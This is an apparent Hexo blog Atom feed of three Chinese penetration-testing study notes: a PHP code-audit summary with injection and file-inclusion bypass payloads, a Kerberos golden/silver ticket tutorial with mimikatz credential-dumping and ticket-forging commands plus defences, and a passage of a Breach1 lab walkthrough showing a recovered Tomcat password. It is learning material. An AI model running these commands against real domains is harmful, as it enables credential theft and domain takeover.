<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-09-19T15:52:06.815Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>《代码审计：企业级web代码安全架构》学习总结（一）</title>
    <link href="http://example.com/2021/09/19/%E3%80%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BC%81%E4%B8%9A%E7%BA%A7web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://example.com/2021/09/19/%E3%80%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BC%81%E4%B8%9A%E7%BA%A7web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-09-19T15:51:33.000Z</published>
    <updated>2021-09-19T15:52:06.815Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一-通用代码审计思路"><a class="markdownIt-Anchor" href="#一-通用代码审计思路"></a> 一、通用代码审计思路</h3><p>(1): 敏感关键字回溯参数传递过程</p><p>(2): 查找可控变量，正向追踪变量传递过程</p><p>(3): 寻找敏感功能点，通读功能点代码</p><p>(4): 全文代码通读</p><h5 id="1-敏感函数回溯参数过程"><a class="markdownIt-Anchor" href="#1-敏感函数回溯参数过程"></a> 1、敏感函数回溯参数过程</h5><p>​<strong>要形成漏洞的条件是1）可控变量、2）危险函数</strong></p><p>​例如SQL漏洞，关键字有select ,insert等，再结合from,where等关键字，我们可以判断是不是一条sql语句，再根据sql注入相关的条件，看看是不是有危险参数传入。</p><p>​这种方法有点是速度快，但是在对漏洞定位利用会花费更多的时间，对逻辑漏洞挖掘覆盖不到。</p><h5 id="2-通读全文代码"><a class="markdownIt-Anchor" href="#2-通读全文代码"></a> 2、通读全文代码</h5><p>​首先是要关注程序的目录结构，特别注意：</p><ul><li>函数集文件（通常名字里带function，common等关键字）</li><li>配置文件（名中可能带config）</li><li>安全过滤文件（带有filter,safe,check等）</li><li>index文件</li></ul><h5 id="3-根据功能点定向审计"><a class="markdownIt-Anchor" href="#3-根据功能点定向审计"></a> 3、根据功能点定向审计</h5><ul><li><p>文件上传功能</p><p>例如，文章编辑，资料编辑，头像上传，附件上传等等。</p></li><li><p>文件管理功能</p><p>程序将文件名或者文件路径直接在参数中传递，则会造成任意文件操作漏洞，例如文件读取就是在路径中使用…/或者…\跳转</p></li><li><p>登录认证功能</p><p>目前的认证方式大多数是基于cookie和session，一些程序为了用户体验，保持较长时间的登录，就会直接从cookie中读取用户信息，这时，cookie的加密算法是不是可信就是个问题，若cookie加密时没有加salt一类的东西，就容易导致任意用户登录漏洞或与越权漏洞。</p></li><li><p>找回密码功能</p></li></ul><hr /><h3 id="二-漏洞挖掘"><a class="markdownIt-Anchor" href="#二-漏洞挖掘"></a> 二、漏洞挖掘</h3><h5 id="1-sql注入"><a class="markdownIt-Anchor" href="#1-sql注入"></a> 1、SQL注入</h5><p>​一般SQL注入经常出现在登录页面，获取http头，订单处理等地方，另外在订单系统里涉及的交互较多，容易造成二次注入。</p><p>​**普通注入：**指通过注入union查询可以直接查询数据库，一般的SQL注入工具可以很好的利用。在审计是可以多关注如select from, mysql_connect, mysql_query等，数据库查询方式还有update,insert,delete。</p><p>​<strong>编码注入：</strong></p><ul><li><p>宽字节注入</p><p>当设置“set character_set_client = gbk”时会导致一个编码转换的注入问题，例如当我们的注入参数里带有%df%27时，会将过滤函数加上的\(也就是%5c)“吃掉”，形成一个新的字符绕过过滤。</p></li><li><p>二次urldecode注入</p><p>原理是我们将参数提交到webserver时，webserver会自动解码一次，例如目标开起了gpc，我们提交?id=1%2527，因为我们提交的参数里没有单引号，所以会被解码，%25的解码效果是%，解码后的结果是1%27。此时程序内要是使用了urlcode或者rawurldecode函数来解码id参数，解码结果是?id=1’。在审计时可以通过搜索urldecode和rawurldecode函数来挖掘漏洞。</p><p><strong>漏洞防范：</strong></p></li><li><p>gpc/runtime魔术引号</p><p>针对单引号，双引号，反斜杠及空字符NULL进行过滤，但是在int型的注入上没有多大作业</p></li><li><p>addslashes函数</p><p>与GPC作用一样，常用于函数开头首先检验是否开启GPC。</p></li><li><p>mysql_real_escape_string函数</p></li><li><p>intval等字符转换</p><p>主要针对int型注入</p></li><li><p>预编译</p></li></ul><hr /><p><strong>2、XSS漏洞</strong></p><p>​寻找xss漏洞的关键是寻找没有被过滤的参数，且参数传入到输出函数如print、print_r、echo、printf、die、var_dump等</p><p>​    <strong>漏洞防范：</strong></p><p>​在输出和调用时通过HTML实体编码防止脚本注入</p><p><strong>3、CSRF漏洞</strong></p><p>​针对CSRF漏洞，黑盒测试时，可以打开几个页面，抓包看看有没有token，去掉referer，如果返回的数据还是一样的就可能有漏洞。审计时，我们需要查看几个核心代码文件、被大量引用的文件有没有带验证token和referer的代码</p><p>​<strong>漏洞防范：</strong></p><ul><li>增加token、referer验证</li><li>增加验证码</li></ul><hr /><p><strong>4、文件操作漏洞</strong></p><p>​文件操作漏洞又分为本地文件包含，远程文件包含。函数有：include()、include_once()、require()、require_once()。他们之间的区别在于：include()、include_once()在包含文件时即使遇到错误，下面的代码仍然会执行；…而require()、require_once()则会直接报错退出程序。</p><p>​文件包含漏洞大多出现在模板加载，模块加载，cache调用等地方</p><p>​<strong>本地文件包含（LFI）：</strong></p><p>​LFI是指仅能包含本机文件的包含漏洞，比如上传一个允许上传的文件格式的文件，再包含来执行代码，包含PHP上传的临时文件、请求的URL或者UA内加入要执行的代码、webserver记录到日志后的日志等等</p><p>​<strong>远程文件包含（RFI）：</strong></p><p>​需要设置allow_url_include = ON，我们就可以直接在相应的请求内传入一个其他网站下的文件。</p><p>​文件包含截断：</p><p>​无法写入.php问件时</p><ul><li>%00截断： 参数后面跟一个%00就可以绕过过滤。但是GPC开启的情况下，失去作用</li><li>.和/截断： windows下 在文件名最后加240个“.”或者“/”截断，在linux下需要2038个/.组合才能截断（PHP5.3之前）</li><li>?截断：在url请求包含的文件最后添加？让server以为？后的内容是请求参数，如/1.txt? 因为在http内2.txt和2.txt?.php的访问结果是一样的</li></ul><p>​<strong>文件上传漏洞</strong></p><p>​在寻找文件上传漏洞时最好的是直接搜索move_uploaded_file()函数，再查看调用这个函数的相关函数是否存在对上传文件的格式限制或是能不能被绕过。</p><p>​较常见是未曾设置文件格式限制、黑名单扩展名绕过、文件头/content-type绕过</p><p>​<strong>漏洞防范：</strong></p><p>​文件操作漏洞有几个共同点如下：</p><p>​(1): 由越权操作引起的可以操作未授权操作的文件</p><p>​(2): 要操作更多的文件需要跳转目录</p><p>​(3): 大多是在请求中传入文件名</p><p>​针对这些特点：</p><p>​(1): 对权限的管理要合理。比如A用户上传的文件，其他平行权限的用户未授权时不能查看，特殊文件只 有特权用户才能查看，对文件的操作比如删除等只有管理员才能操作。</p><p>​(2): 有的文件操作是不需要传入文件名的，比如下载文件时，文件是已知的，我们可以使用参数来代替   文件名作为下载需要的参数。</p><p>​(3): 避免目录跳转问题，主要是通过对传入参数中的’…‘和’/‘以及’\'检查。</p><p>​(4): 针对文件上传，我们使用白名单的方式过滤扩展名。保存上传文件时，重命名文件比如用MD5值代   替。</p><hr /><p><strong>5、代码执行</strong></p><p>​由于程序本身过滤不严，用户可以直接通过请求将代码注入到应用中去执行。类似SQL注入漏洞代码会在SQL服务执行。最终注入的代码会在web server中执行。</p><p>代码执行函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span> 和 assert:</span><br><span class="line">执行PHP代码</span><br><span class="line"></span><br><span class="line">preg_replace:</span><br><span class="line">perg_replace(a,b,c):在C中找到a， 用b替代。若b的末尾存在/e修饰，则会被当做代码执行</span><br><span class="line"></span><br><span class="line">call_user_func和array_map：</span><br><span class="line">call_user_func(a,b,c...):a表示要调用的函数，后面的表示a需要的参数</span><br><span class="line"></span><br><span class="line">动态函数执行：</span><br><span class="line">为了方便函数调用程序员自己定义的由字符串拼接成的函数</span><br><span class="line"></span><br><span class="line">thinkphp代码执行：</span><br><span class="line">GET参数以index.php/a/b/c的形式传递</span><br><span class="line">造成原因是PHP中<span class="string">&quot; &quot;</span>内的内容会被直接当做命令执行</span><br></pre></td></tr></table></figure><p>​<strong>漏洞防范：</strong></p><p>​使用参数白名单过滤，结合正则表达式来进行白名单过滤。</p><hr /><p><strong>6、命令执行</strong></p><p>​命令执行漏洞主要出现在包含环境包的应用里，一些直接在系统安装就可以启动自带的web服务和数据库服务，web应用会有比较多的点之间使用system(); exec(); shell_exec(); passthru(); popen(); proc_open()等函数执行命令调用一些需要的脚本。</p><p>​<strong>漏洞防范：</strong></p><p>​在命令上的防注入函数有：escapeshellcmd()和escapeshellarg()，前者是过滤整个命令，后者是过滤传入的参数。还有就是参数白名单。</p><hr /><p><strong>7、变量覆盖漏洞</strong></p><p>​利用我们自定义的参数来代替程序原有的变量值，结合程序的其他功能来实现攻击。常常是由于函数使用不当造成的，容易引发变量覆盖漏洞的函数有：extract()和parse_str()，而import_request_variables()函数主要是因为在没有开启全局变量注册的时候，调用了这个函数则相当于开启了全局注册变量，在PHP4.5之后这个函数被取消，另外还利用$$的方式注册变量没有去验证已有变量而导致的变量覆盖。</p><p>​寻找变量覆盖漏洞，首先要考虑能不否实现变量覆盖，即使可以实现，后续变量能不能被利用，在审计时可以直接寻找参数带变量的extract()和parse_str()函数和“$$”。</p><p><strong>函数使用不当：</strong></p><ul><li>extract()函数通过从数组中将变量导入到当前符号表，即将数组中的键值对注册成为变量。函数有三个参数其中能不能导致变量覆盖由第二个参数决定：函数能不能产生变量覆盖要看第二个参数extract_type,若为EXTR_OVERWRITE则覆盖变量；若只传入第一个变量的值则默认同上；若为EXTR_IF_EXISTS同上。</li><li>parse_str函数的是解析字符床并注册成为变量，在注册前不会验证变量是否存在，会直接覆盖掉原有的变量。两个参数a,b经过函数处理后，a里的键值对如a=1，会被处理成<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mi mathvariant="normal">并</mi><mi mathvariant="normal">放</mi><mi mathvariant="normal">进</mi><mi>b</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">中</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">若</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">中</mi><mi mathvariant="normal">有</mi></mrow><annotation encoding="application/x-tex">a = 1,并放进b数组中，若数组中有</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">并</span><span class="mord cjk_fallback">放</span><span class="mord cjk_fallback">进</span><span class="mord mathdefault">b</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">若</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">有</span></span></span></span>a=2之类，则覆盖。</li></ul><p><strong>$$变量覆盖：</strong></p><p>​</p><p><strong>漏洞防范：</strong></p><p>​(1): 使用原始变量，常见的变量覆盖漏洞都是在变量注册的时候产生的，因此就不进行变量注册，仅使用原生的变量进行操作，必要的时候可以在代码中直接定义变量，再把请求中的值赋给他。</p><p>​(2): 验证变量存在，注册前先判断变量是不是存在，最重要的一点，自行申明的变量一定要初始化，不然即使注册变量代码在执行流程的最前面也会覆盖掉未初始化的变量。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;一-通用代码审计思路&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#一-通用代码审计思路&quot;&gt;&lt;/a&gt; 一、通用代码审计思路&lt;/h3&gt;
&lt;p&gt;(1): 敏感关键字回溯参数传递过程&lt;/p&gt;
&lt;p&gt;(2): 查找可控变量，正向追踪变量传递过程</summary>
      
    
    
    
    
    <category term="渗透测试学习" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>金银票据</title>
    <link href="http://example.com/2021/09/18/%E9%87%91%E9%93%B6%E7%A5%A8%E6%8D%AE/"/>
    <id>http://example.com/2021/09/18/%E9%87%91%E9%93%B6%E7%A5%A8%E6%8D%AE/</id>
    <published>2021-09-18T03:08:53.000Z</published>
    <updated>2021-09-18T11:54:42.851Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h3><p>关于黄金票据和白银票据的相关知识。</p><h3 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h3><p>先看金银票据的定义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">黄金票据(Ticket-Granting-Ticket)：是直接抓取域控中ktbtgt账号的hash，来在client端生成一个TGT票据，那么该票据是针对所有机器的所有服务。</span><br><span class="line"></span><br><span class="line">白银票据(Silver Ticket)：抓取到了域控服务hash的情况下，在client端以一个普通域用户的身份生成TGS票据，是针对于某个机器上的某个服务的，生成的白银票据,只能访问指定的target机器中指定的服务。</span><br></pre></td></tr></table></figure><p>总而言之，黄金票据就是伪造krbtgt用户的TGT票据，krbtgt用户是域控中用来管理发放票据的用户，拥有了该用户的权限，就可以伪造系统中的任意用户，针对域内的所有用户。而白银票据则是伪造ST（门票），这样的好处是门票不会经过KDC，从而更加隐蔽，但是伪造的门票只对部分服务起作用,如cifs（文件共享服务），mssql，winrm（windows远程管理），DNS等等</p><p>其中一些定义，接下来我们一一介绍：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">krbtgt用户: krbtgt用户是域控中用来管理发放票据的用户，拥有了该用户的权限，就可以伪造系统中的任意用户</span><br><span class="line">TGT(Ticket-Granting-Ticket): 黄金票据</span><br><span class="line">ST(Silver Ticket): 白银票据</span><br><span class="line">Client: Application Client: 应用客户端</span><br><span class="line">TGS: Ticket-Granting Service: 用来授权服务访问</span><br><span class="line">KDC: Key Distribution Center: 秘钥分发中心</span><br></pre></td></tr></table></figure><h3 id="关于kerberos协议"><a class="markdownIt-Anchor" href="#关于kerberos协议"></a> 关于Kerberos协议</h3><p>大致流程如下：</p><p><a href="https://imgtu.com/i/4QbutJ"><img src="https://z3.ax1x.com/2021/09/18/4QbutJ.png" alt="4QbutJ.png" /></a></p><ol><li>Client向KDC发起AS_REQ请求内容为通过Client密码Hash 加密的时间戳、ClientID、网络地址、加密类型等内容</li><li>KDC使用Client hash进行解密，并在ntds.dit(只有域控中才有的数据库)中查找该账户，如果结果正确就返回用krbtgt NTLM-hash加密的TGT票据，TGT里面包含PAC（Privilege Attribute Certificate，不同的账号有不同的权限，PAC就是为了区别不同权限的一种方式），PAC包含Client的sid，Client所在的组</li><li>Client(客户端)凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求</li><li>KDC使用krbtgt NTLM-hash进行解密，如果结果正确，就返回用服务NTLM-hash 加密的TGS票据，并带上PAC返回给Client(客户端)，这一步不管用户有没有访问服务的权限，只要TGT（认证票据）正确，就返回TGS票据</li><li>此时client拿着KDC给的TGS票据去请求服务</li><li>服务端使用自己的NTLM-hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限</li></ol><p>详细过程如下：</p><ul><li><p>用户登录：</p><p>用户登录阶段，通常由用户输入[用户名]和[密码]信息，客户端将用户输入的[密码]信息通过一个  单向Hash函数生成一个[Client密钥]</p></li><li><p>请求身份认证：</p><p>(1)：客户端为执行登录操作的用户向AS(Authentication Server 用来认证用户身份)发送认证请求，附带用户信息。</p><p>(2)：AS收到用户认证请求之后，根据请求中的[用户名]信息，从数据库中查找该用户名是否存在。<br />如果[用户名]存在，则对应的[密码]也可以从数据库中获取到。AS利用相同的单向Hash函数为[密码]生成一个秘钥，如果第1步中用户提供的[密码]信息正确，该秘钥与用户登录章节中的[Client密 钥]相同：</p><p>​此时返回响应消息：</p><p>​ Msg A 使用[Client密钥]加密的[Client/TGS SessionKey]<br />Msg B 使用[TGS密钥]加密的TGT(Ticket-Granting-Ticket)，因此该消息Client不可解析。<br />TGT中包含如下信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[Client/TGS SessionKey]</span><br><span class="line">Client ID</span><br><span class="line">Ticket有效时间</span><br><span class="line">Client网络地址</span><br></pre></td></tr></table></figure><pre><code>  Client收到AS的响应消息以后，利用自身的[Client密钥]可以对Msg A进行解密，这样可以获取到  [Client/TGS SessionKey]。但由于Msg B是使用[TGS密钥]加密的，Client无法对其解密。</code></pre></li><li><p>请求服务授权</p><p>(1): 客户端向TGS发送请求，请求授权。</p><p>包含两个信息：</p><p>​  Msg C：要请求的服务ID, 即[Service ID]；上一步2.2中由AS为Client提供的TGT。<br />Msg D：使用[Client/TGS SessionKey]加密的Authenticator 1 {Client ID, Timestamp}。</p><p>(2): TGS为Client响应服务授权票据</p><p>​  TGS为Client响应的消息包括：</p><p>​   Msg E 使用[Service密钥]加密的Client-To-Server Ticket, 该Ticket中包含了如下信息:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[Client/Server SessionKey]</span><br><span class="line">Client网络地址</span><br><span class="line">Ticket有效时间</span><br><span class="line">Client IDMsg F 使用[Client/TGS SessionKey]加密的[Client/Server SessionKey]。</span><br></pre></td></tr></table></figure><p>​    Msg F 使用[Client/TGS SessionKey]加密的[Client/Server SessionKey]。</p><p>注意：</p><p>Msg E使用了[Service密钥]加密，该消息可视作是TGS给Service Server的消息，只不过由Client  一起携带。</p><p>Msg F使用了[Client/TGS SessionKey]加密，因此，该消息对Client可见。Client对其解密以后可 获取到[Client/Server SessionKey]。</p></li><li><p>发送服务请求</p><p>(1): Client向SS(Service Server)发送服务请求</p><p>发送的消息中包括：</p><p>Msg E 上一步3.2中，TGS为Client响应的消息Msg E。该消息可以理解为由Client为SS携带的消息。<br />Msg G 由[Client/Server SessionKey]加密的Authenticator 2，包含{Client ID, Timestamp}信息。这里的Authenticator 2区别于前面3.1步骤中的Authenticator 1。<br />注意：</p><p>[Client/Server SessionKey]并未直接透明传输，而是被包含在使用[Service密钥]加密的Msg E中。<br />既然[Client/Server SessionKey]并不直接透明传输， Client需要向SS证明自己拥有正确的[Client/Server SessionKey]，所以，Authenticator 2使用了[Client/Server SessionKey]加密。</p><p>(2): SS响应Client</p><p>SS收到客户端的服务请求之后，先利用自身的[Service密钥]对Msg E进行解密，提取出Client-To-Server Ticket, 在3.2步骤中，提到了该Ticket中包含了[Client/Server SessionKey]以及Client ID信息。<br />SS使用[Client/Server SessionKey]解密Msg G，提取Client ID信息，而后将该Client ID与Client-To-Server Ticket中的Client ID进行比对，如果匹配则说明Client拥有正确的[Client/Server SessionKey]。<br />而后，SS向Client响应Msg H(包含使用[Client/Server SessionKey]加密的Timestamp信息)。<br />Client收到SS的响应消息Msg H之后，再使用[Client/Server SessionKey]对其解密，提取Timestamp信息，然后确认该信息与Client发送的Authenticator 2中的Timestamp信息一致。</p></li></ul><h4 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h4><ul><li><p>黄金票据（Golden Ticket）</p><p>前提：</p><p>​拿到域控<br />​有krbtgt用户的hash值（借助mimikatzkatz）</p><p>要求：</p><p>​域名<br />​域的SID 值<br />​域的KRBTGT账户NTLM密码哈希<br />​伪造用户名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获取域名</span></span><br><span class="line">whoami</span><br><span class="line">net time /domain</span><br><span class="line">ipconfig /all </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 获取SID</span></span><br><span class="line">whoami /all</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 获取域的KRBTGT账户NTLM密码哈希或者aes-256值</span></span><br><span class="line">lsadump::dcsync /domain:zz.com /user:krbtgt /csv</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 伪造管理员用户名</span></span><br><span class="line">net group &quot;domain admins&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 清除所有票据</span></span><br><span class="line">klist purge</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用mimikatz伪造指定用户的票据并注入到内存</span></span><br><span class="line">kerberos::golden  /admin:administrator  /domain:zz.com  /sid:S-1-5-21-1373374443-4003574425-2823219550  /krbtgt:9f3af6256e86408cb31169871fb36e60  /ptt</span><br></pre></td></tr></table></figure></li><li><p>白银票据</p><p>利用前提：</p><p>拿到目标机器hash(是目标机,不一定是域控)<br />条件要求：</p><p>域名<br />域sid<br />目标服务器FQDN<br />可利用的服务<br />服务账号的NTML HASH<br />需要伪造的用户名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获取域名</span></span><br><span class="line">whoami</span><br><span class="line">net time /domain</span><br><span class="line">ipconfig /all </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 获取SID</span></span><br><span class="line">whoami /all</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 目标机器的hostname+域名 /target:\\\\WIN-75NA0949GFB.NOONE.com</span></span><br><span class="line">net time /domain  </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 可利用的服务CIFS(磁盘共享的服务)</span></span><br><span class="line"> /service:CIFS</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 要伪造的用户名</span></span><br><span class="line"> /user:Administrator</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 服务账号的ntlm <span class="built_in">hash</span>(Primary Username : WIN-75NA0949GFB$带$的<span class="built_in">hash</span>，不是admin的)</span></span><br><span class="line"> /rc4:08d93ddf15a6309a46daaa7ec8565296</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 利用文件共享服务cifs，获取服务账号(域控名)得NTMLhash值(在14068基础上使用mimikatz获取)</span></span><br><span class="line">mimikatz.exe privilege::debug sekurlsa::logonpasswords exit &gt;&gt; 2.txt</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 清除所有票据</span></span><br><span class="line">klist purge</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用mimikatz伪造指定用户的票据并注入到内存</span></span><br><span class="line"></span><br><span class="line">kerberos::golden /domain:域名 /sid:填sid /target:完整的域控名 /service:cifs /rc4:服务账号NTMLHASH /user:用户名 /ptt</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h4 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h4><p>（1）限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机（不要让其他管理员登录到这些服务器）将所有其他权限委派给自定义管理员组。这大大降低了攻击者访问域控制器的Active Directory的ntds.dit。如果攻击者无法访问AD数据库（ntds.dit文件），则无法获取到KRBTGT帐户密码</p><p>（2）禁用KRBTGT帐户，并保存当前的密码以及以前的密码。KRBTGT密码哈希用于在Kerberos票据上签署PAC并对TGT（身份验证票据）进行加密。如果使用不同的密钥（密码）对证书进行签名和加密，则DC（KDC）通过检查KRBTGT以前的密码来验证</p><p>（3）建议定期更改KRBTGT密码（毕竟这是一个管理员帐户）。更改一次，然后让AD备份，并在12到24小时后再次更改它。这个过程应该对系统环境没有影响。这个过程应该是确保KRBTGT密码每年至少更改一次的标准方法</p><p>（4）一旦攻击者获得了KRBTGT帐号密码哈希的访问权限，就可以随意创建黄金票据。通过快速更改KRBTGT密码两次，使任何现有的黄金票据（以及所有活动的Kerberos票据）失效。这将使所有Kerberos票据无效，并消除攻击者使用其KRBTGT创建有效金票的能力</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#简介&quot;&gt;&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;关于黄金票据和白银票据的相关知识。&lt;/p&gt;
&lt;h3 id=&quot;原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#原理</summary>
      
    
    
    
    
    <category term="域渗透" scheme="http://example.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>breach1靶场渗透（二）</title>
    <link href="http://example.com/2021/09/17/breach1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://example.com/2021/09/17/breach1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2021-09-17T05:05:38.000Z</published>
    <updated>2021-09-17T07:31:21.222Z</updated>
    
    <content type="html"><![CDATA[<p>紧接上一回，看看过滤后的记录，找到一条链接：</p><p><a href="https://imgtu.com/i/4KeOTH"><img src="https://z3.ax1x.com/2021/09/17/4KeOTH.png" alt="4KeOTH.png" /></a></p><p>打开网页看看，并不能正确响应，看到地址栏提示不安全？</p><p><a href="https://imgtu.com/i/4Km8AJ"><img src="https://z3.ax1x.com/2021/09/17/4Km8AJ.png" alt="4Km8AJ.png" /></a></p><p>https为何提示不安全？证书过期了么？</p><p>换个火狐浏览器打开试试看，提示是不安全的连接。可能是浏览器认为证书过期。尝试使用burp做个转发（就是加个burp代理，拦截再放过请求包。）因为burp的证书是受信任的：</p><p><a href="https://imgtu.com/i/4Knhxx"><img src="https://z3.ax1x.com/2021/09/17/4Knhxx.png" alt="4Knhxx.png" /></a></p><p>OK，新的页面，新的希望。一个HTTP basic 验证。回到鲨鱼，往下再看看记录。在第三条找到了basic关键字：</p><p><a href="https://imgtu.com/i/4KuEzq"><img src="https://z3.ax1x.com/2021/09/17/4KuEzq.png" alt="4KuEzq.png" /></a></p><p>尝试解码看看：</p><p><a href="https://imgtu.com/i/4Ku66P"><img src="https://z3.ax1x.com/2021/09/17/4Ku66P.png" alt="4Ku66P.png" /></a></p><p>获取到一组用户密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcat:Tt\5D8F(#!*u=G)4m7zB</span><br></pre></td></tr></table></figure><p>登录看看，一个tomcat的后台：</p><p><a href="https://imgtu.com/i/4KKJhj"><img src="https://z3.ax1x.com/2021/09/17/4KKJhj.png" 